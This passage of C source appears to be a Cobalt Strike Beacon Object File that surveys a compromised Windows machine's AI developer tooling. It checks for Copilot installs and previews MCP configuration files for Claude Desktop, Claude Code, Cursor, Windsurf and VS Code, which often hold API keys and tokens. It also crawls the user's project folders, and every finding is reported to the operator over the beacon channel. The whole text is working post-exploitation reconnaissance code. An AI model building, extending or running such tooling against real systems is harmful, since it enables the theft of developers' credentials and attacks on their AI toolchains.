    wchar_t search[MAX_PATH_LEN];
    wchar_t child[MAX_PATH_LEN];
    WIN32_FIND_DATAW fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD needed;

    if (!root_pattern || !results || results->project_hits >= MAX_PROJECT_HITS) {
        return;
    }

    inline_memset(root, 0, sizeof(root));
    needed = KERNEL32$ExpandEnvironmentStringsW(root_pattern, root, MAX_PATH_LEN);
    if (needed == 0 || needed > MAX_PATH_LEN || !is_directory(root)) {
        return;
    }

    inspect_project_candidate(root, results);
    if (results->project_hits >= MAX_PROJECT_HITS) {
        return;
    }

    inline_memset(search, 0, sizeof(search));
    inline_memset(&fd, 0, sizeof(fd));
    if (!build_path(root, L"\\*", search, MAX_PATH_LEN)) {
        return;
    }

    hFind = KERNEL32$FindFirstFileW(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (results->project_hits >= MAX_PROJECT_HITS) {
            break;
        }
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0 || fd.cFileName[0] == L'.') {
            continue;
        }

        inline_memset(child, 0, sizeof(child));
        if (!build_path(root, L"\\", child, MAX_PATH_LEN) ||
            !append_wide_in_place(child, fd.cFileName, MAX_PATH_LEN)) {
            continue;
        }
        inspect_project_candidate(child, results);
    } while (KERNEL32$FindNextFileW(hFind, &fd));

    KERNEL32$FindClose(hFind);
}

static void check_mcp_configs(scan_results_t *results) {
    static const wchar_t *project_roots[] = {
        L"%USERPROFILE%\\source",
        L"%USERPROFILE%\\Source",
        L"%USERPROFILE%\\src",
        L"%USERPROFILE%\\dev",
        L"%USERPROFILE%\\Dev",
        L"%USERPROFILE%\\code",
        L"%USERPROFILE%\\Code",
        L"%USERPROFILE%\\repos",
        L"%USERPROFILE%\\Repos",
        L"%USERPROFILE%\\projects",
        L"%USERPROFILE%\\Projects",
        L"%USERPROFILE%\\Documents\\GitHub",
        L"%USERPROFILE%\\Documents\\Repos",
        L"%USERPROFILE%\\Documents\\Projects",
        L"%USERPROFILE%\\Desktop"
    };
    size_t i;
    wchar_t appData[MAX_PATH_LEN];
    wchar_t path[MAX_PATH_LEN];

    if (!results) {
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n" SECTION_MCP_CONFIGS ":\n");

    preview_expanded_config(L"Claude Desktop MCP Config", L"%APPDATA%\\Claude\\claude_desktop_config.json", results);
    preview_expanded_config(L"Claude Code MCP Config", L"%USERPROFILE%\\.claude.json", results);
    preview_expanded_config(L"Cursor Global MCP Config", L"%USERPROFILE%\\.cursor\\mcp.json", results);
    preview_expanded_config(L"Windsurf MCP Config", L"%USERPROFILE%\\.codeium\\windsurf\\mcp_config.json", results);

    inline_memset(appData, 0, sizeof(appData));
    inline_memset(path, 0, sizeof(path));
    if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appData, MAX_PATH_LEN) > 0) {
        if (build_path(appData, L"\\Code\\User\\globalStorage", path, MAX_PATH_LEN)) {
            scan_vscode_mcp_extensions(path, L"VS Code", results);
        }
        inline_memset(path, 0, sizeof(path));
        if (build_path(appData, L"\\Code - Insiders\\User\\globalStorage", path, MAX_PATH_LEN)) {
            scan_vscode_mcp_extensions(path, L"VS Code Insiders", results);
        }
    }

    for (i = 0; i < (sizeof(project_roots) / sizeof(project_roots[0])); i++) {
        if (results->project_hits >= MAX_PROJECT_HITS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Project MCP hit cap reached (%d)\n", MAX_PROJECT_HITS);
            break;
        }
        scan_project_root_pattern(project_roots[i], results);
    }

    if (results->mcp_files_found == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] No MCP configs discovered in default global or project roots\n");
    } else {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[i] MCP summary: %d artifacts\n",
            results->mcp_files_found
        );
    }
}

void go(char *args, unsigned long alen) {
    datap parser = {0};
    scan_results_t results;

    BeaconDataParse(&parser, args, (int)alen);
    inline_memset(&results, 0, sizeof(results));

    BeaconPrintf(CALLBACK_OUTPUT, "[i] Mapping AI developer surface:\n");

    check_windows_copilot();
    check_office_copilot();
    check_edge_copilot();
    check_github_copilot();
    check_third_party_ai();
    check_mcp_configs(&results);
}
